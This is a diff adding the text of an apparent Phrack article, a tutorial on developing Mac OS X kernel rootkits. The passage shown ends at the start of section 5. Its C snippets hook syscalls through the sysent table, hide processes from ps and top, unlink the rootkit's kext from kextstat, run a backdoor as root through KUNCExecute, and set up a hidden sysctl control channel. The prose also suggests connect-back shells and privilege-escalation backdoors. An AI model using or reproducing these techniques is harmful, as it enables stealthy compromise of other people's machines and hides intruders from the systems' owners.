@@ -1,0 +1,1160 @@
+				==Phrack Inc.==
+
+		Volume 0x0d, Issue 0x42, Phile #0x10 of 0x11
+
+|=-----------------------------------------------------------------------=|
+|=----------------=[ Developing Mac OSX kernel rootkits  ]=--------------=|
+|=-----------------------------------------------------------------------=|
+|=---------------=[    By wowie <wowie@hack.se> &        ]=--------------=|
+|=---------------=[       ghalen@hack.se                 ]=--------------=|
+|=---------------=[                                      ]=--------------=|
+|=---------------=[    #hack.se                          ]=--------------=|
+|=-----------------------------------------------------------------------=|
+
+
+-[ Content
+
+1 - Introduction
+  1.1 - Background
+  1.2 - Rootkit basics
+  1.3 - Syscall basics
+  1.4 - Userspace and kernelspace
+2 - Introducing the XNU kernel
+  2.1 - OS X kernel rootkit history
+  2.2 - Finding the syscall entry table
+  2.3 - Opaque kernel structures
+  2.4 - The I/O Kit Framework
+3 - Kernel development on Mac OS X
+  3.1 - Kernel version dependence
+4 - Your first OS X kernel rootkit
+  4.1 - Replacement of a simple syscall
+  4.2 - Hiding processes 
+  4.3 - Hiding files
+  4.4 - Hiding a kernel extension
+  4.5 - Running userspace programs from kernelspace
+  4.6 - Controlling your rootkit from userspace
+5 - Runtime kernel patching using the Mach APIs
+  5.1 - System call hijacking
+  5.2 - Direct Kernel Object Manipulation
+6 - Detection
+  6.1 - Detecting hooked system calls on Mac OS X
+7 - Summary
+8 - References
+9 - Code
+
+--[ 1 - Introduction
+
+-[ 1.1 - Background
+
+Rootkits for different operating systems have been around for many years.
+Linux, Windows, and the different *BSD-flavors have all had their fair
+share of rootkits. Kernel rootkits are just a continuation of the standard
+file-swapping rootkits of days past. The dawn of tools like Osiris and
+Tripwire forced coders seeking to subvert the operating system to take
+refuge in kernelspace.
+
+The basic idea of a rootkit is to change the behavior and output of
+standard commands and tools to hide the presence of backdoors, sniffers
+and other types of malicious code. And just as within other parts of the
+security industry it is a continuing arms race between those who seek to
+subvert the kernel and those who seek to protect it.
+
+In this article we will describe the basics of runtime kernel patching and
+kernel rootkits for the Mac OS X operating system and how to develop your
+own. It is intended as an entry level tutorial for beginners and as well
+as guide for those interested in adapting existing kernel rootkits from
+other operating systems to Mac OS X. Apple supports two CPU architectures
+for the Mac OS X operating system: Intel and PowerPC. We believe that this
+guide is architecture neutral and that most of the source code is
+compatible with both architectures. 
+
+-[ 1.2 - Rootkit basics
+
+The purpose of a rootkit is to hide the presence of an intruder and his
+tools. In order to do this the most common features of a kernel rootkit is
+the ability to hide files, processes and network sockets. More advanced
+rootkits sometimes provide backdoors and keyboard sniffers.
+
+When a program such as '/bin/ls' is run to lists the files and folders of
+a directory it calls a function in the kernel called a syscall. The
+syscall is invoked from userland and transfers control from the userland
+process to the kernelspace function getdirentries(). The getdirentries()
+function returns a list of files for the specified directory to the
+userland process that in return displays the list to the user.
+
+In order to hide the presence of a specific file the data returned from
+the getdirentires() syscall needs to be modified and the entry for the
+file deleted before returning the data to the user. This can be
+accomplished in a number of different ways; one way is to modify the
+filesystem processing layer (VFS) and another is to directly modify the
+getdirentires() function.  In this brief introduction we will take the
+easy route and modify the getdirentries() function.
+
+-[ 1.3 - Syscall basics
+
+When a userland process needs to call a kernel function it invokes a
+syscall. A syscall is an API function that provides access to services
+provided by the kernel such as reading or writing to files, listing files
+in directories or opening and closing network sockets. Each syscall has a
+number, and all syscalls are invoked referencing this syscall number.
+
+When a userland process wants to invoke a kernel function it is almost
+always done through a wrapper function in the libc-library that in turn
+generates a software interrupt that transfers control from the userland
+process in to the kernel. The kernel stores a list of all available
+syscall functions in a table called the sysentry table, each entry has a
+function pointer to the location of the function for that syscall number.
+
+The kernel looks up the syscall that the userland process wants to call in
+the syscall entry table and invokes that function to handle the request.
+A list of the available syscalls as well as their numbers can be found in
+/usr/include/sys/syscall.h. For example, syscalls of interest to a rootkit
+wanting to hide files are: 
+
+196 - SYS_getdirentries
+222 - SYS_getdirentriesattr 
+344 - SYS_getdirentries64 
+
+Each of these entries in the table points to the function in the kernel
+responsible for returning a list of files. SYS_getdirentries is an older
+version of the function, SYS_getdirentriesattr is a similar version of
+with support for OS X specific attributes. SYS_getdirentries64 is a newer
+version that supports longer filenames. SYS_getdirentries is used by for
+example bash, SYS_getdirentries64 is used by the ls command and
+SYS_getdirentriesattr is used by pure OS X-integrated applications like
+the Finder. Each of these functions needs to be replaced in order to
+provide a seamless 'experience' for the end-user.
+
+In order to modify the output of the function a wrapper function needs to
+be created that can replace the original function. The wrapper function
+will first call the original function, search the output and do the
+required censoring before returning the sanitized data to the userland
+process.
+
+-[ 1.4 - Userspace and Kernelspace
+
+The kernel runs in a separate memory space that is private to the kernel
+in the same way as each user process has it's own private memory. This
+means that is is not possible to just read and write freely memory from
+the kernel. Whenever the kernel needs to modify memory in user-space, for
+instance copy data to or from userspace, specific routines and protocols
+needs to followed. A number of help functions are provided for this
+specific task, most notably copyin(9) and copyout(9). More information
+about these functions can be found in the manpages for copy(9) and
+store(9).
+
+--[ 2 - Introducing the XNU kernel
+
+XNU, the Mac OS X kernel and it's core is based on the Mach micro kernel
+and FreeBSD 5. The Mach layer is responsible for kernel threads,
+processes, pre-emptive multitasking, message-passing, virtual memory
+management and console i/o. Above the Mach layer is the BSD layer that
+supplies the POSIX API, networking and filesystems amongst other things.
+The XNU kernel also has an object oriented device driver framework known
+as the I/O Kit. This mashup of different technologies provide several
+different ways to accomplish the same task; to modify the running kernel.
+Another interesting choice in the design of the XNU kernel is that both
+the kernel- and userland has their own 4gb address space.
+
+
+-[ 2.1 - OS X kernel rootkit history
+
+One of the first publicly released Mac OS X kernel rootkits were WeaponX
+[9] which is developed by nemo [5] and was released in November 2004. It
+is based on the same kernel extension (loadable kernel module) technique
+that most kernel rootkits use and provides the expected basic
+functionality of a kernel rootkit. WeaponX [9] does however not work on
+newer versions of the Mac OS X operating system due to major kernel
+changes.
+
+In the latest few releases of Mac OS X Apple has done a couple things
+hardening the kernel and making it more difficult to subvert. Of
+particular interest is the fact that it no longer exports the sysentry
+table and that several of the key kernel structures are opaque and hidden
+from kernel developers.
+
+-[ 2.2 - Finding the syscall entry table
+
+As of OS X version 10.4 the sysentry table is no longer an exported symbol
+from the kernel. This means that the compiler will not be able to
+automatically identify the position in memory where the sysentry table is
+stored. This can either be solved by searching the memory for an
+appropriate looking table or using something else as a reference. Landon
+Fuller identified that the exported symbol nsysent (the number of entries
+in the sysentry table) is stored in close proximity to the sysentry table.
+He also wrote a small routine that finds the sysentry table and returns a
+pointer to it that can be used to manipulate the table as one see fit [1].
+
+The sysent structure is defined like this:
+
+struct sysent {
+        int16_t         sy_narg;                /* number of arguments */
+        int8_t          reserved;               /* unused value */
+        int8_t          sy_flags;               /* call flags */
+        sy_call_t       *sy_call;               /* implementing function */
+        sy_munge_t      *sy_arg_munge32;/* munge system call arguments for
+32-bit processes */
+        sy_munge_t      *sy_arg_munge64;/* munge system call arguments for
+64-bit processes */
+        int32_t         sy_return_type; /* return type */
+        uint16_t        sy_arg_bytes;   /* The size of all arguments for
+32-bit system calls, in bytes */
+}  *_sysent;
+
+
+The most interesting part of the structure is the "sy_call" pointer, which
+is a pointer to the actual syscall handler function. Thats the function we
+want our rootkit to hook. Hooking the function is as easy as changing the
+value of the pointer to point at our own function somewhere in memory.
+
+-[ 2.3 - Opaque kernel structures
+
+With OS X version 10.4 Apple also changed the kernel structure in order to
+provide a more stable kernel API. This was done to ensure that kernel
+extensions doesn't break when internal kernel structures change. This
+involves hiding large parts of the internal structures behind API:s and
+only exporting chosen parts of the structures to developers.
+
+A good example of this is the process structure called "proc". Which is
+available from both userland and kernelland. The userland version is
+defined in /usr/include/sys/proc.h and looks like this:
+
+struct extern_proc {
+        union {
+                struct {
+                        struct  proc *__p_forw; /* Doubly-linked run/sleep queue. */
+                        struct  proc *__p_back;
+                } p_st1;
+                struct timeval __p_starttime;   /* process start time */
+        } p_un;
+#define p_forw p_un.p_st1.__p_forw
+#define p_back p_un.p_st1.__p_back
+#define p_starttime p_un.__p_starttime
+        struct  vmspace *p_vmspace;     /* Address space. */
+        struct  sigacts *p_sigacts;     /* Signal actions, state (PROC ONLY). */
+        int     p_flag;                 /* P_* flags. */
+        char    p_stat;                 /* S* process status. */
+        pid_t   p_pid;                  /* Process identifier. */
+        pid_t   p_oppid;         /* Save parent pid during ptrace. XXX */
+        int     p_dupfd;         /* Sideways return value from fdopen. XXX */
+        /* Mach related  */
+        caddr_t user_stack;     /* where user stack was allocated */
+        void    *exit_thread;   /* XXX Which thread is exiting? */
+        int             p_debugger;             /* allow to debug */
+        boolean_t       sigwait;        /* indication to suspend */
+        /* scheduling */
+        u_int   p_estcpu;        /* Time averaged value of p_cpticks. */
+        int     p_cpticks;       /* Ticks of cpu time. */
+        fixpt_t p_pctcpu;        /* %cpu for this process during p_swtime */
+        void    *p_wchan;        /* Sleep address. */
+        char    *p_wmesg;        /* Reason for sleep. */
+        u_int   p_swtime;        /* Time swapped in or out. */
+        u_int   p_slptime;       /* Time since last blocked. */
+        struct  itimerval p_realtimer;  /* Alarm timer. */
+        struct  timeval p_rtime;        /* Real time. */
+        u_quad_t p_uticks;              /* Statclock hits in user mode. */
+        u_quad_t p_sticks;              /* Statclock hits in system mode. */
+        u_quad_t p_iticks;              /* Statclock hits processing intr. */
+        int     p_traceflag;            /* Kernel trace points. */
+        struct  vnode *p_tracep;        /* Trace to vnode. */
+        int     p_siglist;              /* DEPRECATED */
+        struct  vnode *p_textvp;        /* Vnode of executable. */
+        int     p_holdcnt;              /* If non-zero, don't swap. */
+        sigset_t p_sigmask;     /* DEPRECATED. */
+        sigset_t p_sigignore;   /* Signals being ignored. */
+        sigset_t p_sigcatch;    /* Signals being caught by user. */
+        u_char  p_priority;     /* Process priority. */
+        u_char  p_usrpri;       /* User-priority based on p_cpu and p_nice. */
+        char    p_nice;         /* Process "nice" value. */
+        char    p_comm[MAXCOMLEN+1];
+        struct  pgrp *p_pgrp;   /* Pointer to process group. */
+        struct  user *p_addr; /* Kernel virtual addr of u-area (PROC ONLY). */
+	u_short p_xstat;        /* Exit status for wait; also stop signal. */
+        u_short p_acflag;       /* Accounting flags. */
+        struct  rusage *p_ru;   /* Exit information. XXX */
+};
+
+
+The internal definition in the kernel is available from the xnu source in
+the file xnu-xxx/bsd/sys/proc_internal.h and contains a lot more info than
+it's userland counterpart. If we take a look at the userland version of
+the proc structure from Mac OS X 10.3, with Darwin 7.0, and compares it to
+the structure above we can spot the differences right away (some comments
+and whitespace is removed to save space and make it more readable)
+
+struct	proc {
+	LIST_ENTRY(proc) p_list;	/* List of all processes. */
+	struct	pcred *p_cred;		/* Process owner's identity. */
+	struct	filedesc *p_fd;		/* Ptr to open files structure. */
+	struct	pstats *p_stats;	/* Accounting/statistics (PROC ONLY). */
+	struct	plimit *p_limit;	/* Process limits. */
+	struct	sigacts *p_sigacts;	/* Signal actions, state (PROC ONLY). */
+#define	p_ucred		p_cred->pc_ucred
+#define	p_rlimit	p_limit->pl_rlimit
+	int	p_flag;			/* P_* flags. */
+	char	p_stat;			/* S* process status. */
+	char	p_pad1[3];
+	pid_t	p_pid;			/* Process identifier. */
+	LIST_ENTRY(proc) p_pglist;	/* List of processes in pgrp. */
+	struct	proc *p_pptr;	 	/* Pointer to parent process. */
+	LIST_ENTRY(proc) p_sibling;	/* List of sibling processes. */
+	LIST_HEAD(, proc) p_children;	/* Pointer to list of children. */
+#define	p_startzero	p_oppid
+	pid_t	p_oppid;	 /* Save parent pid during ptrace. XXX */
+	int	p_dupfd;	 /* Sideways return value from fdopen. XXX */
+	u_int	p_estcpu;	 /* Time averaged value of p_cpticks. */
+	int	p_cpticks;	 /* Ticks of cpu time. */
+	fixpt_t	p_pctcpu;	 /* %cpu for this process during p_swtime */
+	void	*p_wchan;	 /* Sleep address. */
+	char	*p_wmesg;	 /* Reason for sleep. */
+	u_int	p_swtime;	 /* DEPRECATED (Time swapped in or out.) */
+#define	p_argslen p_swtime	 /* Length of process arguments. */
+	u_int	p_slptime;	 /* Time since last blocked. */
+	struct	itimerval p_realtimer;	/* Alarm timer. */
+	struct	timeval p_rtime;	/* Real time. */
+	u_quad_t p_uticks;		/* Statclock hits in user mode. */
+	u_quad_t p_sticks;		/* Statclock hits in system mode. */
+	u_quad_t p_iticks;		/* Statclock hits processing intr. */
+	int	p_traceflag;		/* Kernel trace points. */
+	struct	vnode *p_tracep;	/* Trace to vnode. */
+	sigset_t p_siglist;		/* DEPRECATED. */
+	struct	vnode *p_textvp;	/* Vnode of executable. */
+#define	p_endzero	p_hash.le_next
+	LIST_ENTRY(proc) p_hash;	/* Hash chain. */
+	TAILQ_HEAD( ,eventqelt) p_evlist;
+#define	p_startcopy	p_sigmask
+	sigset_t p_sigmask;		/* DEPRECATED */
+	sigset_t p_sigignore;	/* Signals being ignored. */
+	sigset_t p_sigcatch;	/* Signals being caught by user. */
+	u_char	p_priority;	/* Process priority. */
+	u_char	p_usrpri;	/* User-priority based on p_cpu and p_nice. */
+	char	p_nice;		/* Process "nice" value. */
+	char	p_comm[MAXCOMLEN+1];
+	struct 	pgrp *p_pgrp;	/* Pointer to process group. */
+#define	p_endcopy	p_xstat
+	u_short	p_xstat;	/* Exit status for wait; also stop signal. */
+	u_short	p_acflag;	/* Accounting flags. */
+	struct	rusage *p_ru;	/* Exit information. XXX */
+	int	p_debugger;	/* 1: can exec set-bit programs if suser */
+	void	*task;			/* corresponding task */
+	void	*sigwait_thread;	/* 'thread' holding sigwait */
+	struct lock__bsd__ signal_lock;	/* multilple thread prot for signals*/
+	boolean_t	 sigwait;	/* indication to suspend */
+	void	*exit_thread;		/* Which thread is exiting? */
+	caddr_t	user_stack;		/* where user stack was allocated */
+	void * exitarg;			/* exit arg for proc terminate */
+	void * vm_shm;			/* for sysV shared memory */
+	int  p_argc;			/* saved argc for sysctl_procargs() */
+	int p_vforkcnt;		/* number of outstanding vforks */
+	void *  p_vforkact;     /* activation running this vfork proc */
+	TAILQ_HEAD( , uthread) p_uthlist; /* List of uthreads  */
+	pid_t	si_pid;
+	u_short si_status;
+	u_short	si_code;
+	uid_t	si_uid;
+	TAILQ_HEAD( , aio_workq_entry ) aio_activeq;
+	int		aio_active_count;	/* entries on aio_activeq */
+	TAILQ_HEAD( , aio_workq_entry ) aio_doneq;
+	int		aio_done_count;		/* entries on aio_doneq */
+	struct klist p_klist;  /* knote list */
+	struct  auditinfo		*p_au;	/* User auditing data */
+#if DIAGNOSTIC
+#if SIGNAL_DEBUG
+	unsigned int lockpc[8];
+	unsigned int unlockpc[8];
+#endif /* SIGNAL_DEBUG */
+#endif /* DIAGNOSTIC */
+};
+
+As you can seen, Apple has redone this structure quite a bit and removed
+a lot of stuff, most of the changes where introduced between version 10.3
+and 10.4 of Mac OS X. One of the changes to the structure is the removal
+of the p_ucred pointer, which is a pointer to a structure that contains
+the user credentials of the current process. 
+
+This effectively breaks nemos [5] technique of setting a process user-id
+and group-id to zero, which he does like this:
+
+void uid0(struct proc *p) {
+	register struct pcred *pc = p->p_cred;
+	pcred_writelock(p);
+	(void)chgproccnt(pc->p_ruid, -1);
+	(void)chgproccnt(0, 1);
+	pc->pc_ucred = crcopy(pc->pc_ucred);
+	pc->pc_ucred->cr_uid = 0;
+	pc->p_ruid = 0;
+	pc->p_svuid = 0;
+	pcred_unlock(p);
+	set_security_token(p);
+	p->p_flag |= P_SUGID;
+	return;
+}
+
+For a rootkit developer that wants to modify specific kernel structures
+this is somewhat of a problem, both the fact that the kernel structures
+are neither exported or well documented and the fact that they might
+rapidly change between kernel versions. Fortunately the kernel source is
+now open source and can be freely downloaded from Apple. This makes it
+possible to extract the needed kernel structures from the source.
+
+-[ 2.4 - The I/O Kit Framework
+
+Mac OS X contains a complete framework of libraries, tools and various
+other resources for creating device drivers. This framework is called the
+I/O Kit. The I/O Kit framework provides an abstract view of the hardware
+to the upper layers of Mac OS X, which simplifies device driver
+development and thus makes it's less time consuming. The entire framework
+is object-oriented and implemented using a somewhat cut down version C++
+to promote increased code reuse.
+
+Since this framework operates in kernelspace and can interact with actual
+hardware, it's ideal for writing keylogging software. A good example of
+abusing the I/O Kit framework for just that purpose is the keylogger
+called "logKext", [10] written by drspringfield, which utilizes the I/O
+Kit framework to log a users keystrokes. This is just one of many uses of
+this framework in rootkit development. Feel free to explore and come up
+with your own creative ways of subverting the Mac OS X kernel using the
+I/O Kit framework.
+
+--[ 3 - Kernel development on Mac OS X
+
+As Mac OS X is somewhat of a hybrid between a number of different
+technologies runtime modification of the operating system  can be done in
+several ways. One of the easiest methods is to load the 'improved'
+functionality as a kernel driver. Drivers can be loaded either as kernel
+extensions for the BSD sub-layer or as Object Oriented I/O Kit drivers.
+For the purpose of this first exercise only ordinary BSD kernel extensions
+will be utilized due to their simplicity and ease of development.
+
+The easiest way to write a kernel extension for Mac OS X is to use the
+XCode-templates for 'Generic Kernel Extension'. Open Xcode, Select 'New
+Project' in the File-menu. From the list of available templates choose
+'Generic Kernel Extension' under 'Kernel Extension'. Give the project a
+suitable name, such as 'rootkit 0.1' and click 'Finish'. This creates a
+new Xcode project for your new kernel rootkit.
+
+The newly automatically created .c-file contains the entry and exit points
+for the kernel extension: 
+
+kern_return_t rootkit_0_1_start (kmod_info_t * ki, void * d) {
+    return KERN_SUCCESS;
+}
+
+
+kern_return_t rootkit_0_1_stop (kmod_info_t * ki, void * d) {
+    return KERN_SUCCESS;
+}
+
+rootkit_0_1_start() will be invoked when the kernel extension is loaded
+using /sbin/kextload and rootkit_0_1_stop() will be invoked when the
+kernel extension is unloaded using /sbin/kextunload. 
+
+Loading and unloading of kernel extensions require root privileges, and
+the code in these functions will be executed in kernelspace with full
+control of the entire operating system. It is therefore of the utmost
+importance that any code executed takes makes sure not to make a mess of
+everything and thereby crashes the entire operating system. To quote the
+Apple 'Kernel Program Guide': "Kernel programming is a black art that
+should be avoided if at all possible" [4].
+
+Any changes made to the kernel in the start()-function must be undone in
+the stop-function(). Functions, variables and other types of loadable
+objects will be deallocated when the module is unloaded and any future
+reference to them will cause the operating system to misbehave or in worst
+case crash.
+
+Building your project is as easy as clicking the 'build button'. The
+compiled kernel extension can be found in the build/Relase/-directory and
+is named 'rootkit 0.1.kext'. /sbin/kextload refuses to load kernel
+extensions unless they are owned by the root user and belongs to the wheel
+group. This can easily be fixed by chown:ing the files accordingly.
+Fledging kernel hackers that dislikes the Xcode GUI:s will be please to
+known that the project can be build just as easily from the command line
+using the 'xcodebuild' command. 
+
+Apple provides the XCode IDE and the gcc compiler on the Mac OS X DVD, if
+needed the latest version can also be downloaded from [2] after
+registration.  The source code for the XNU kernel can also be downloaded
+from [3]. It is recommended that you keep a copy of the kernel sourcecode
+at hand as reference during development.
+
+One of the great advantages of using the kernel extension API is that the
+kextload command takes care of everything from linking to loading. This
+means that the entire rootkit can be written in C, making it almost
+trivially easy. Another great advantage of C-development is portability
+which is an important issue considering that Mac OS X is available for two
+different CPU architectures.
+
+-[ 3.1 - Kernel version dependence
+
+As Landon Fuller notes in research access to the nsysent variable needed
+to find the sysentry-table is restricted unless the kext is compiled for a
+specific kernel release. This is due to the simple fact that the address
+of this variable is likely to change between kernel releases. Kernel
+dependence for kernel extensions is configured in the Info.plist file
+included in the XCode-project. The 'com.apple.kernel'-key needs to be
+added to OSBundleLibraries with the version set to the Kernel release as
+indicated by the 'uname -r' command:
+
+<key>OSBundleLibraries</key>
+<dict>
+    <key>com.apple.kernel</key>
+    <string>9.6.0</string>
+</dict>
+
+This ties the compiled kernel extension specifically to version 9.6.0 of
+the Kernel. A recompile of the kernel extension is needed for each minor
+and major release. The kernel extension will refuse to load in any other
+version of the Mac OS X kernel, in many cases that might be considered a
+good thing.  
+
+--[ 4 - Your first OS X kernel rootkit
+
+-[ 4.1 - Replacement of a simple syscall
+
+To start of the whole kernel subversion business we'll take a quick
+example of replacing the getuid() function. This function returns the
+current user ID and in this example it will be replaced it with a function
+that always returns uid zero (root). This will not automatically give all
+users root access, only the illusion of having root access. Fun but
+innocent :)
+
+int new_getuid()
+{
+  return(0); 
+}
+
+kern_return_t rootkit_0_1_start (kmod_info_t * ki, void * d) {
+
+  struct sysent *sysent = find_sysent();
+  sysent[SYS_getuid].sy_call = (void *) new_getuid;
+
+  return KERN_SUCCESS;
+
+}
+
+This simple code-snippet first defines a new getuid()-function that always
+returns 0 (root). The new function will be loaded in kernel memory by the
+kextload-function. When the start()-function runs it will replace the
+original getuid() syscall with the new and 'improved' version. Returning 
+KERN_SUCCESS indicates to the operating system that everything went as 
+planed and that the insertion of the kernel extension was successful.
+
+A complete version can be found in the code section of this paper;
+including the unloading function that might prove useful once the initial
+thrill is over. 
+
+-[ 4.2 - Hiding processes 
+ 
+The '/bin/ps' command, 'top' and the Activity Monitor all list running
+processes using the sysctl(3) syscall. sysctl(2) is a general purpose
+multifunction API used to communicate with a multitude of different
+functions in the kernel. sysctl(2) is used both to list running processes
+as well open network sockets. In order to intercept and modify the running
+process list the entire sysctl syscall needs to be intercepted and the
+commands parsed in order to identify calls to the CTL_KERN->KERN_PROC
+command used to list current running processes.
+
+The sysctl(2) syscall is intercepted using the exactly same method as
+getuid(), but one of the major differences is that special attention needs
+to be taken with regards to the arguments. In order to support both big
+and little endian systems Apple uses padding macros named PADL and PADR
+that makes the argument struct look very exotic. The easiest way to get it
+right is to copy the entire struct definition from the XNU kernel source
+in order to avoid confusion with the padding. 
+
+sysctl(2) takes its function commands in the form of a char-array called
+'name'. The commands are hierarchical and most commands have several
+subcommands that in turn can have subcommands or arguments. The sysctl(2)
+commands and their respective subcommands can be found in
+'/usr/include/sys/sysctl.h'.
+
+The CTL_KERN->KERN_PROC command to sysctl copies a list of all running
+processes to a user provided buffer. From the perspective of the rootkit
+this presents a problem since we want to modify the data before it is
+returned to the user but since the syscall writes the data directly to the
+user provided buffer this is problematic. Fortunately we are in position
+to manipulate the data in the user buffer prior returning control to the
+user software. This requires copying the data from userspace into a
+kernelspace buffer, doing the required modification and then copying the
+data back into userspace.
+
+First memory needed to store the copy of the data needs to be allocated
+using the MALLOC-macro, then the data needs to be copied from userspace
+using the copyin(9)-function. The copyin(9) function copies data from
+userspace to kernelspace. Then the data needs to be processed and selected
+entries removed. The actual process of deleting an entry is done by
+overwriting it with the rest of the data in the buffer. This requires
+doing an overlapping memory copy, this functionality is provided by the
+bcopy(3) function. Once an entry has been removed the counter for the
+total size of the buffer needs to be decreased and the data can finally be
+returned, or rather copied, to userspace. 
+
+      /* Search for process to remove */
+      for (i = 0; i < nprocs; i++) 
+        if(plist[i].kp_proc.p_pid == 11) /* hardcoded PID */
+          { 
+
+            /* If there is more then one entry left in the list 
+	     * overwrite this entry with the rest of the buffer */
+
+            if((i+1) < nprocs)
+              bcopy(&plist[i+1],&plist[i],(nprocs - (i + 1)) * sizeof(struct kinfo_proc));
+            
+            /* Decrease size */
+	    oldlen -= sizeof(struct kinfo_proc);
+            nprocs--;
+          }
+
+The modified data is then copied back to the userspace buffer using the
+copyout(9) function. In this case two different functions are used to copy
+data to userspace. The suulong(9) function is used to copy only small
+amounts of data to userspace while copyout(9) is used to copy the actual
+data buffer.
+
+      /* Copy back the length to userspace */
+      suulong(uap->oldlenp,oldlen);
+
+      /* Copy the data back to userspace */
+      copyout(mem,uap->old, oldlen);
+
+
+The data trailing the last entry will, if the data was modified, contain
+an extra copy of the last entry in the buffer, something that might be
+used to detect that the buffer has been modified. To avoid this the
+trailing data can be zero:ed. A more sophisticated rootkit might want to
+store a copy of the original buffer prior to the call to the real syscall
+and use that data to pad the remaining buffer space. 
+
+A reference implementation of a processes hiding kernel extension can be 
+found in the code section of this paper.
+
+-[ 4.3 - Hiding files
+
+As noted earlier, three different syscalls are of interest when hiding
+files, SYS_getdirentries, SYS_getdirentriesattr and SYS_getdirentries64.
+All of these syscalls share the sysctl(2) approach in that the calling
+application provides a buffer that the syscall will fill with appropriate
+data and return a counter indicating how much data was written. Due to the
+variable size of each record pointer arithmetics is required when parsing
+the data. All in all it is a complicated procedure and any mishaps is
+likely to cause a kernel crash. It is also important to patch all three
+syscalls of the getdirent-syscall in order to maintain the illusion that
+the malicious files have disappeared.
+
+The process is very similar to hiding a process; the original function is
+invoked, the data copied from userspace to kernelspace, modified as needed
+and then copied back. 
+
+A reference implementation of a file hiding kernel extension can be found
+in the code section of this paper.
+
+-[ 4.4 - Hiding a kernel extension
+
+Kernel modules can be listed with the command 'kextstat'. If the rogue
+rootkit kernel extension can be easily identified using the kextstat
+commands it sort of voids the purpose of the rootkit. nemo [5] identified
+a simple and elegant way to hide the presence of a kernel module for the
+WeaponX [9] kernel rootkit. 
+
+extern kmod_info_t *kmod; 
+
+void activate_cloaking() 
+{ 
+        kmod_info_t *k; 
+        k = kmod; 
+        kmod = k->next; 
+}
+
+This short snippet of code finds the linked list containing the loaded
+modules and simply delinks the last loaded module from that list. Since
+the kextstat utility will walk this list when presenting the information
+on loaded kernel extensions the newly loaded rootkit will disappear from
+that list. For the same reason the kextunload utility will also fail to
+unload the module from the kernel, which actually can be quite annoying.
+
+-[ 4.5 - Running userspace programs from kernelspace
+
+On Mac OS X there exists a special API called KUNC (Kernel-User
+Notification Center) [6]. This API is used when the kernel (i.e. a KEXT)
+might need to display a notification to the user or run commands in
+userspace.
+
+The KUNC function used to execute commands in userspace is KUNCExecute().
+This function is quite handy in rootkit development, since we may execute
+any command we want as root from kernelspace. The function definition
+looks like this.
+
+(Taken from xnu-xxx/osfmk/UserNotification/KUNCUserNotifications.h)
+
+#define kOpenApplicationPath    0
+#define kOpenPreferencePanel    1
+#define kOpenApplication        2
+
+#define kOpenAppAsRoot          0
+#define kOpenAppAsConsoleUser   1
+
+kern_ret_t
+KUNCExecute(char *executionPath, int openAsUser, int pathExecutionType);
+
+The "executionPath" is the file-system path to the application or
+executable to execute. The "openAsUser" flag can either be
+"kOpenAppAsConsoleUser", to execute the application as the logged-in user
+or "kOpenAppAsRoot", to run the application as root. The
+"pathExecutionType" flag specifies the type of application to execute, and
+can be one of the following.
+
+kOpenApplicationPath - The absolute file-system path to a executable.
+kOpenPreferencePanel - The name of a preference pane in
+/System/Library/PreferencePanes.
+kOpenApplication - The name of a application in the "/Applications" folder.
+
+To execute the binary "/var/tmp/mybackdoor" we simply do like this:
+
+KUNCExecute("/var/tmp/mybackdoor", kOpenAppAsRoot, kOpenApplicationPath);
+
+This function is especially useful in combination with some sort of
+trigger, like a hooked tcp-handler that executes the function and spawns a
+connect-back shell to the source-ip of a magic trigger-packet. The
+interesting parts of the network layer is actually exported and can be 
+easily modified. 
+
+Or if you prefer a local privilege escalation backdoor, why not hook
+SYS_open and execute the specified file with KUNCExecute if you supply a
+magic flag? The possibilities are endless.
+
+-[ 4.6 - Controlling your rootkit from userspace
+
+Once the appropriate syscalls and kernel functions has been replaced with
+rogue versions capable of hiding files, network sockets and processes each
+of these needs to know what to hide. 
+
+A popular way to trigger process hiding is to hook SYS_kill and send a
+special signal (31337 perhaps?) to the process to hide. This is easy and
+requires no special tools of any kind. If the processes hiding is
+performed by setting special flags on the process this flag can be
+inherited for fork() and exec() and thereby hide an entire process-tree. 
+
+Hiding files and sockets is trickier since we have no easy way to indicate
+to the kernel that we want them hidden. The creation of a new syscall is
+an easy way, or to piggy-back on one of the hooked ones and have a special
+magic argument to trigger the communication code. This does however
+require special tools in userspace capable of calling the right syscall
+with the correct arguments. These tools can be identified and searched for
+even if the rootkit tries to hide them in the filesystem they are always
+vulnerable to offline analysis. 
+
+An easy way to create a communication channel that doesn't require special
+tools or an entry in the /dev/-directory is to use sysctl. In the Mac OS X
+kernel drivers can register their own variables and have them changed
+using the /usr/sbin/sysctl-tool which is available by default on all
+systems. 
+
+Registering a new sysctl can be easily done using the normal kext
+procedures. The source for the example below can be found in reference 7.
+
+/* global variable where argument for our sysctl is stored */
+int  sysctl_arg = 0;
+
+static int sysctl_hideproc SYSCTL_HANDLER_ARGS 
+{     
+      int error;     
+      error = sysctl_handle_int(oidp, oidp->oid_arg1,oidp->oid_arg2, req); 
+		
+     if (!error && req->newptr) 
+      {         
+	 if(arg2 == 0)
+	   printf("Hide process %d\n",sysctl_arg);
+	 else	       
+	   printf("Unhide process %d\n",sysctl_arg);
+       }
+       
+   /* We return failure so that we dont show up in "sysclt -A"-listings. */
+   return KERN_FAILURE;
+}
+       
+       
+/* Create our sysctl:s */
+SYSCTL_PROC(_hw, OID_AUTO, hideprocess,CTLTYPE_INT|CTLFLAG_ANYBODY|CTLFLAG_WR,
+	    &sysctl_arg, 0, &sysctl_hideproc , "I", "Hide a process"); 
+
+SYSCTL_PROC(_hw, OID_AUTO, unhideprocess,CTLTYPE_INT|CTLFLAG_ANYBODY|CTLFLAG_WR,
+	    &sysctl_arg, 1, &sysctl_hideproc , "I", "Unhide a process"); 
+
+
+kern_return_t kext_start (kmod_info_t * ki, void * d) {
+
+    /* Register our sysctl */
+    sysctl_register_oid(&sysctl__hw_hideprocess);
+    sysctl_register_oid(&sysctl__hw_unhideprocess);
+
+    return KERN_SUCCESS;
+}
+
+This code registers two new sysctl variables, hw.hideprocess and
+hw.unhideprocess. When written to using sysctl -w hw.hideprocess=99 the
+function sysctl_hideproc() is invoked and can be used to add the selected
+PID to the list of processes to hide. A sysctl for hiding files is
+slightly different since it takes a string as argument instead of an
+integer but the overall procedure is the same. The major reason to use
+sysctl is that it support dynamic registration of variable and the
+required tool sysctl is provided by the operating system. 
+
+The -A flag for sysctl is avoided by returning KERN_FAILURE whenever the
+function is called, this causes the newly created variables to be omitted
+from the listing. 
+
+There is also a number of other ways of communicating with the kernel and
+controlling your rootkit. For example you can use the Mach API for IPC or
+using kernel control sockets, both has their pros and cons.
+
+--[ 5 - Runtime kernel patching using the Mach APIs
+
